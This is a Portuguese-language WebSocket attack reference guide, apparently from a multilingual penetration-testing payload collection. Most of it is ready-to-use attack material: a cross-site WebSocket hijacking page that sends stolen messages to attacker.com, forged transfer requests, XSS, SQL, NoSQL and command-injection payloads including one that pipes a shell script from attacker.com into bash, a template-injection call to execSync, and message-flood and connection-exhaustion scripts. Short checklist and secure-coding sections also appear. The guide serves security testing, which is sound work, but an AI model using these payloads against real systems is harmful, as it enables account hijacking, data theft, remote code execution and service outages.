# 🔌 Guia de referência de ataques WebSocket

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](WebSocket-Attacks.tr.md) • [🇬🇷 Ελληνικά](WebSocket-Attacks.el.md)

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

> **Notas de precisão:** O handshake apresentado corresponde ao WebSocket sobre HTTP/1.1 ([RFC 6455](https://www.rfc-editor.org/rfc/rfc6455.html)). CSWSH envolve uma ligação iniciada de outra origem com contexto autenticado reutilizável e operações ou dados relevantes; a ausência de validação de Origin não prova, isoladamente, um ataque bem-sucedido. Clientes fora do navegador podem definir esse cabeçalho, pelo que não substitui autenticação/autorização. `wss://` protege o transporte, não os controlos de acesso da aplicação. A secção «Implementação segura» é pseudocódigo: mistura interfaces de biblioteca, pressupõe funções de validação e analisa o token de forma simplificada. Não constitui uma implementação completa. Tokens em URL podem ficar registados; fuga por cabeçalhos de referência depende do contexto.

---

<a id="-websocket-basics"></a>
## 🔍 Noções básicas de WebSocket

### Pedido de handshake
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### Resposta de handshake
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Deteção
```
- ws:// (sem cifragem)
- wss:// (cifrado com TLS)
- Cabeçalho Upgrade: websocket
- O separador Network apresenta "101 Switching Protocols"
```

---

<a id="-websocket-vulnerabilities"></a>
## 🎯 Vulnerabilidades WebSocket

### 1. Cross-Site WebSocket Hijacking (CSWSH, sequestro de WebSocket entre sites)

**Condição vulnerável:** O servidor não valida o cabeçalho Origin

```html
<!-- Página do atacante -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Ligação aberta; o atacante pode enviar mensagens
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Roubar os dados e enviá-los ao atacante
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**Ataque semelhante a CSRF:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Executar ações em nome da vítima
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

### 2. Ausência de validação de Origin

**Teste:**
```bash
# Utilizar wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# Utilizar websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**Exploração:**
```javascript
// Se o servidor aceitar qualquer origem
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

### 3. Contorno da autenticação

**Ligação WS sem autenticação:**
```javascript
// Ligar sem cookies/tokens
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // Não é necessária autenticação?
};
```

**Token no URL (risco de fuga):**
```
wss://target.com/ws?token=SECRET_TOKEN
// O token pode aparecer em registos ou cabeçalhos de referência (conforme o contexto)
```

**Testar estados de autenticação diferentes:**
```javascript
// Testar com um token expirado
// Testar com um token modificado
// Testar sem token
// Testar com o token de outro utilizador
```

---

### 4. Ataques de injeção através de WebSocket

**XSS através de WebSocket:**
```javascript
// Enviar um payload de XSS
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**Injeção SQL:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**Injeção de comandos:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**Injeção NoSQL:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

### 5. Ataques de negação de serviço (DoS)

**Inundação de mensagens:**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Mensagens grandes
  }, 1);
};
```

**Esgotamento de ligações:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Manter a ligação aberta

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

### 6. Manipulação de dados

**Alteração de mensagens:**
```javascript
// Intercetar e modificar mensagens
// Utilizar a interceção de WebSocket do Burp Suite

// Original
{"action": "transfer", "amount": 10, "to": "user123"}

// Modificado
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Condições de corrida:**
```javascript
// Enviar vários pedidos em rápida sucessão
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

<a id="-testing-tools"></a>
## 🛠️ Ferramentas de teste

### Burp Suite
```
1. Proxy → WebSockets history
2. Botão direito → Send to Repeater
3. Modificar e reenviar mensagens
4. Selecionar "Auto-scroll to end"
```

### wscat (CLI)
```bash
# Instalar
npm install -g wscat

# Ligar
wscat -c wss://target.com/ws

# Com cabeçalhos
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# Com origem
wscat -c wss://target.com/ws -o "https://target.com"
```

### websocat
```bash
# Instalar
cargo install websocat

# Ligar
websocat wss://target.com/ws

# Com cabeçalhos
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Script Python de teste
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Testar payloads
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### Ferramentas de desenvolvimento do navegador
```javascript
// Monitorizar o tráfego WebSocket
// F12 → Network → filtro WS

// Testes manuais
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

<a id="-payload-collection"></a>
## 💉 Coleção de payloads

### Testes de autenticação
```json
// Sem autenticação
{"action": "get_secret_data"}

// Token vazio
{"token": "", "action": "admin_action"}

// Token null
{"token": null, "action": "delete_user"}
```

### Payloads de XSS
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

### Payloads de SQLi
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

### Injeção de comandos
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

### Travessia de diretórios
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

<a id="-testing-checklist"></a>
## 📋 Lista de verificação dos testes

```markdown
## Lista de verificação de segurança WebSocket

□ Identificar endpoints WebSocket
□ Verificar a validação do cabeçalho Origin
□ Testar CSWSH (Cross-Site WebSocket Hijacking)
□ Testar os requisitos de autenticação
□ Verificar se os tokens são transmitidos de forma segura
□ Testar vulnerabilidades de injeção (XSS, SQLi, etc.)
□ Testar a autorização (acesso a dados de outros utilizadores)
□ Verificar a limitação do ritmo de pedidos
□ Testar os limites de tamanho das mensagens
□ Procurar exposição de dados sensíveis
□ Testar a gestão das ligações (restabelecimento de ligação)
□ Verificar a cifragem (wss:// em comparação com ws://)
```

---

<a id="-secure-implementation"></a>
## 🔐 Implementação segura

```javascript
// Validação de Origin no servidor
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// Autenticação baseada em tokens
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// Validação dos dados de entrada
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

<a id="-related-payloads"></a>
## 🔗 Payloads relacionados

- [Payloads de XSS](XSS.pt.md)
- [Payloads de SQLi](SQLi.pt.md)
- [Injeção de comandos](Command-Injection.pt.md)

---

**Voltar aos payloads:** [💉 Coleção de payloads](../../README.md#-payloads-collection)
